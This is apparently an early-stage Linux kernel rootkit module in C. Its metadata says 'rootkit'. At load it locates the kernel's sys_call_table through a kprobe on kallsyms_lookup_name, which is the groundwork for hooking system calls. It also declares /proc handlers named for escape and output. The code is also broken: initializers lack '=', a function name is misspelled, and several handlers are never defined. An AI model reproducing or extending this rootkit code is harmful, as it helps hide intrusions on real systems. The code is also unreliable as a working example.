#include <linux/init.h>             //must have to make a kernal module
#include <linux/module.h>           //must have to make a kernal module
#include <linux/kernel.h>           //to ger kernal methods
#include <linux/syscalls.h>         // to get syscalltable
#include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
#include <linux/kprobes.h>          //work around for kernal 5.6.0 and above

MODULE_LICENSE("GPL");
MODULE_AUTHOR("infernexio");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.0.1");

unsigned long *__sys_call_table = NULL;



static int __init init_func(void){
    printk(KERN_INFO "rootkit: initalized\n");

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
    // proc_ops version
    static const struct proc_ops proc_file_fops_escape = {
        .proc_write = escape_write,
    };

    static const struct proc_ops proc_file_fops_output = {
       .proc_write = output_write,
        .proc_read = output_read,
    };
    #else
    // file_operations version
    static const struct file_operations proc_file_fops_escape = {
        .owner = THIS_MODULE,
        .write = escape_write,
    };

    static const struct file_operations proc_file_fops_output = {
        .owner = THIS_MODULE,
        .write = output_write,
        .read = output_read,
    };
    #endif

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    #define KPROBE_LOOKUP 1
    #include <linux/kprobes.h>
    static struct kprobe kp = {
        .symbol_name "kallsyms_lookup_name"
    };
    #endif

    #ifdef KPROBE_LOOKUP
        /* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
        kallsyms_lookup_name_t kallsyms_lookup_name;

        /* register the kprobe */
        register_kprobe(&kp);

        /* assign kallsyms_lookup_name symbol to kp.addr */
        kallsyms_lookup_name (kallsyms_lookup_name_t) kp.addr;

        /* done with the kprobe, so unregister it */
        uregister_kprobe(&kp);
    #endif
    
    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    printk(KERN_DEBUG "rootkit: sysCallTable was found at 0x%1x\n", __sys_call_table);

    return 0;
}

static void __exit exit_func(void){
    printk(KERN_INFO "rootkit: stoped\n");
}


module_init(init_func);
module_exit(exit_func);
